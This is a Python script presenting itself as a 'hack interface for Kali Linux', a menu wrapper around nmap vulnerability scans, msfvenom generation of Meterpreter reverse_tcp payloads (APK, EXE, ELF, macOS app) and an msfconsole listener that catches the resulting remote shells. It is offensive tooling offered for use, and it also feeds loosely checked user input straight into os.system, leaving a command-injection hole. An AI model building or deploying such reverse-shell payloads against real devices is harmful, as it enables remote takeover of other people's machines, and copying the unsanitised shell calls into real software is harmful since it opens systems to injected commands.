import os
import re
from colorama import Fore, Style, init

init(autoreset=True)

def print_ascii():
    ascii_art = (
        Fore.GREEN + "    __  ___ \n"
        "   /  |/  /____   \n"
        "  / /|_/ / ___/  \n"
        " / /  / / /__   \n"
        "/_/  /_/\\___/  \n"
        + Fore.BLUE +
        "  _  __     _ _ \n"
        " | |/ /__ _| (_)\n"
        " | ' // _` | | |\n"
        " | . \\ (_| | | |\n"
        " |_|\_\\__,_|_|_|\n"
        + Style.RESET_ALL
    )
    print(ascii_art)

def clear_screen():
    os.system("clear")

def print_centered(text, color_code):
    print(f"\033[{color_code}m{text.center(80)}\033[0m")

def check_command_availability(command):
    if os.system(f"which {command}") != 0:
        print(Fore.RED + f"[!] {command} is not installed." + Style.RESET_ALL)
        return False
    return True

def validate_ip(ip):
    pattern = re.compile(r"^(\d{1,3}\.){3}\d{1,3}$")
    return bool(pattern.match(ip))

def validate_port(port):
    """Valide si un port est valide."""
    try:
        return 1 <= int(port) <= 65535
    except ValueError:
        return False

def scan_network():
    while True:
        clear_screen()
        print_centered("=== SCAN NETWORK ===", "34")
        print("0. Return")
        print("1. Scan and search vulnerabilities")
        print("2. Scan")
        print("10. Exit")
        choice = input("\nChoose an option: ")

        if choice == "0":
            break
        elif choice == "1":
            ip_range = input(Fore.YELLOW + "[?] Enter the IP range to scan (e.g., 192.168.1.0/24): " + Style.RESET_ALL)
            if not validate_ip(ip_range.split("/")[0]):  # Basic validation for IP
                print(Fore.RED + "[!] Invalid IP range." + Style.RESET_ALL)
                continue
            print(Fore.GREEN + "[+] Scanning and searching vulnerabilities..." + Style.RESET_ALL)
            if check_command_availability("nmap"):
                os.system(f"nmap --script vuln {ip_range}")
        elif choice == "2":
            ip_range = input(Fore.YELLOW + "[?] Enter the IP range to scan (e.g., 192.168.1.0/24): " + Style.RESET_ALL)
            if not validate_ip(ip_range.split("/")[0]):  # Basic validation for IP
                print(Fore.RED + "[!] Invalid IP range." + Style.RESET_ALL)
                continue
            print(Fore.GREEN + "[+] Scanning network..." + Style.RESET_ALL)
            if check_command_availability("nmap"):
                os.system(f"nmap {ip_range}")
        elif choice == "10":
            print("Goodbye!")
            exit()
        else:
            print(Fore.RED + "[!] Invalid option." + Style.RESET_ALL)
        input("\nPress Enter to continue...")

def metasploit_payload():
    while True:
        clear_screen()
        print_centered("=== METASPLOIT PAYLOAD ===", "34")
        print("0. Return")
        print("1. Android Payload")
        print("2. Windows Payload")
        print("3. Linux Payload")
        print("4. MacOS Payload")
        print("5. Launch msfconsole")
        print("10. Exit")
        choice = input("\nChoose an option: ")

        if choice == "0":
            break
        elif choice in ["1", "2", "3", "4"]:
            ip = input(Fore.YELLOW + f"[?] Enter your IP address (LHOST): " + Style.RESET_ALL)
            if not validate_ip(ip):
                print(Fore.RED + "[!] Invalid IP address." + Style.RESET_ALL)
                continue

            port = input(Fore.YELLOW + "[?] Enter the port (LPORT) [default: 4444]: " + Style.RESET_ALL) or "4444"
            if not validate_port(port):
                print(Fore.RED + "[!] Invalid port." + Style.RESET_ALL)
                continue

            output_file = "payload.apk" if choice == "1" else "payload.exe" if choice == "2" else "payload.elf" if choice == "3" else "payload.app"

            payloads = {
                "1": "android/meterpreter/reverse_tcp",
                "2": "windows/meterpreter/reverse_tcp",
                "3": "linux/x64/meterpreter/reverse_tcp",
                "4": "osx/x64/meterpreter/reverse_tcp"
            }
            payload = payloads[choice]
            file_formats = {
                "1": "apk",
                "2": "exe",
                "3": "elf",
                "4": "osx-app"
            }
            file_format = file_formats[choice]
            command = f"msfvenom -p {payload} LHOST={ip} LPORT={port} -f {file_format} > {output_file}"

            print(Fore.GREEN + f"[+] Generating payload with command:\n{command}" + Style.RESET_ALL)
            if check_command_availability("msfvenom"):
                os.system(command)
            print(Fore.GREEN + f"[+] Payload created: {output_file}" + Style.RESET_ALL)

        elif choice == "5":
            ip = input(Fore.YELLOW + "[?] Enter your IP address (LHOST): " + Style.RESET_ALL)
            if not validate_ip(ip):
                print(Fore.RED + "[!] Invalid IP address." + Style.RESET_ALL)
                continue

            port = input(Fore.YELLOW + "[?] Enter the port (LPORT) [default: 4444]: " + Style.RESET_ALL) or "4444"
            if not validate_port(port):
                print(Fore.RED + "[!] Invalid port." + Style.RESET_ALL)
                continue

            os_choice = input(Fore.YELLOW + "[?] Select the OS (1: Android, 2: Windows, 3: Linux, 4: macOS): " + Style.RESET_ALL)
            if os_choice not in ["1", "2", "3", "4"]:
                print(Fore.RED + "[!] Invalid option." + Style.RESET_ALL)
                continue

            payloads = {
                "1": "android/meterpreter/reverse_tcp",
                "2": "windows/meterpreter/reverse_tcp",
                "3": "linux/x64/meterpreter/reverse_tcp",
                "4": "osx/x64/meterpreter/reverse_tcp"
            }
            selected_payload = payloads[os_choice]
            if check_command_availability("msfconsole"):
                print(Fore.GREEN + "[+] Launching msfconsole..." + Style.RESET_ALL)
                os.system(f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD {selected_payload}; set LHOST {ip}; set LPORT {port}; exploit'")

        elif choice == "10":
            print("Goodbye!")
            exit()
        else:
            print(Fore.RED + "[!] Invalid option." + Style.RESET_ALL)
        input("\nPress Enter to continue...")

def main_menu():
    while True:
        clear_screen()
        print_ascii()
        print_centered("=== HACK INTERFACE FOR KALI LINUX ===", "32")
        print("1. Scan Network")
        print("2. Metasploit Payload (reverse_tcp)")
        print("10. Exit")
        choice = input("\nChoose an option: ")

        if choice == "1":
            scan_network()
        elif choice == "2":
            metasploit_payload()
        elif choice == "10":
            print("Goodbye!")
            break
        else:
            print(Fore.RED + "[!] Invalid option." + Style.RESET_ALL)
        input("\nPress Enter to continue...")

if __name__ == "__main__":
    main_menu()
